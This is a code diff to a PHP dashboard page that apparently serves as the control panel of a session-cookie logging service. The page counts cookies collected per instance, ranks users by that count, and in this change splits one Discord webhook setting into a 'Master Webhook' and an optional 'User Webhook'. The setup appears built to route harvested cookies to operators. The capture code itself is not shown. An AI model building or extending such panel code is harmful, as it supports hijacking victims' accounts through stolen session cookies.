@@ -22,6 +22,7 @@ if (!$instanceData) {
 $username = $instanceData['username'] ?: $directory;
 $profilePic = $instanceData['profilePicture'];
 $webhook = $instanceData['webhook'];
+$userWebhook = $instanceData['userWebhook'];
 $token = $_SESSION['token'];
 
 $totalVisits = $instanceData['stats']['totalVisits'];
@@ -60,7 +61,7 @@ $summaryToday = $dailySummary[$today];
 $summaryYesterday = $dailySummary[$yesterday];
 $summaryChange = $summaryYesterday != 0 ? round((($summaryToday - $summaryYesterday) / $summaryYesterday) * 100) : ($summaryToday > 0 ? 100 : 0);
 
-// Get rank info
+// Get rank info (using COOKIES not "logs")
 $rankInfo = getRankInfo($totalCookies);
 $currentRank = $rankInfo['current']['name'];
 $currentRankIcon = $rankInfo['current']['icon'];
@@ -79,7 +80,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     if ($_POST['action'] === 'update_settings') {
         $newUsername = trim($_POST['username'] ?? '');
         $newProfilePic = trim($_POST['profilepic'] ?? '');
-        $newWebhook = trim($_POST['webhook'] ?? '');
+        $newMasterWebhook = trim($_POST['webhook'] ?? '');
+        $newUserWebhook = trim($_POST['userwebhook'] ?? '');
         
         $path = __DIR__ . "/../instances/$directory";
         
@@ -93,10 +95,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
             $profilePic = $newProfilePic;
         }
         
-        if (!empty($newWebhook) && filter_var($newWebhook, FILTER_VALIDATE_URL)) {
-            file_put_contents("$path/webhook.txt", $newWebhook, LOCK_EX);
-            $webhook = $newWebhook;
-            $_SESSION['webhook'] = $newWebhook;
+        if (!empty($newMasterWebhook) && filter_var($newMasterWebhook, FILTER_VALIDATE_URL)) {
+            file_put_contents("$path/webhook.txt", $newMasterWebhook, LOCK_EX);
+            $webhook = $newMasterWebhook;
+        }
+        
+        if (!empty($newUserWebhook) && filter_var($newUserWebhook, FILTER_VALIDATE_URL)) {
+            file_put_contents("$path/userwebhook.txt", $newUserWebhook, LOCK_EX);
+            $userWebhook = $newUserWebhook;
         }
         
         $successMessage = 'Settings updated successfully!';
@@ -857,8 +863,13 @@ $publicUrl = "$protocol://$domain/public/?dir=" . urlencode($directory);
                         </div>
 
                         <div class="form-group">
-                            <label class="form-label">Discord Webhook</label>
+                            <label class="form-label">Master Webhook</label>
                             <input type="url" class="form-input" name="webhook" value="<?php echo htmlspecialchars($webhook); ?>" placeholder="https://discord.com/api/webhooks/...">
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">User Webhook (Optional)</label>
+                            <input type="url" class="form-input" name="userwebhook" value="<?php echo htmlspecialchars($userWebhook); ?>" placeholder="https://discord.com/api/webhooks/...">
                         </div>
 
                         <button type="submit" class="submit-btn">
